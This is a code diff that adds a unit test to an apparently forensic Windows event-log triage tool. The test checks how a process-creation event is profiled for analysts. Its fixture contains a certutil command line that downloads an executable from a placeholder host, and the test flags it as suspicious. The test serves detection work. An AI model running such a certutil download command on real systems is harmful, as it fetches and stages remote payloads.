@@ -12,6 +12,7 @@ from rapidtriage.artifacts.windows.eventlog import (
     build_evtx_message_rendering_diff,
     build_evtx_recovery_corpus_diff,
     build_evtx_trusted_tool_record_diff,
+    event_semantics_profile,
     NativeEvtxRecordCandidate,
     native_evtx_commercial_uplift_evidence,
     native_evtx_core_accuracy_gates,
@@ -153,6 +154,38 @@ class RapidTriageWindowsArtifactsCollectorTests(unittest.TestCase):
             ["positional[1]", "positional[2]"],
         )
         self.assertTrue(rendering["provenance"]["provider_message_resource_resolved"])
+
+    def test_event_semantics_profile_preserves_analyst_pivots_and_validation_steps(self) -> None:
+        profile = event_semantics_profile(
+            event_id="4688",
+            provider_name="Microsoft-Windows-Security-Auditing",
+            channel="Security",
+            category="process-created",
+            event_family="execution",
+            channel_family_value="security",
+            data={
+                "NewProcessName": r"C:\Windows\System32\certutil.exe",
+                "CommandLine": "certutil -urlcache -split -f http://example.invalid/a.exe a.exe",
+                "ParentProcessName": r"C:\Windows\explorer.exe",
+            },
+            normalized_fields={
+                "new_process_name": r"C:\Windows\System32\certutil.exe",
+                "command_line": "certutil -urlcache -split -f http://example.invalid/a.exe a.exe",
+                "parent_process_name": r"C:\Windows\explorer.exe",
+                "user_name": "alice",
+            },
+            detected_terms=["certutil"],
+            risk_flags=["suspicious-term:certutil"],
+            is_native_evtx=True,
+        )
+
+        self.assertEqual(profile["profile_version"], "eventlog-analyst-semantics-v1")
+        self.assertEqual(profile["severity"], "medium")
+        self.assertIn("Prefetch", " ".join(profile["analyst_questions"]))
+        self.assertIn("mft-usn", profile["correlation_targets"])
+        self.assertEqual(profile["source_field_values"]["command_line"], "certutil -urlcache -split -f http://example.invalid/a.exe a.exe")
+        self.assertIn("content-risk-term", profile["risk_tags"])
+        self.assertIn("attach trusted EVTX parser diff", profile["validation_requirements"][0])
 
     def test_native_evtx_recovery_candidate_emits_report_citation_manifest(self) -> None:
         with tempfile.TemporaryDirectory() as tmp_dir:
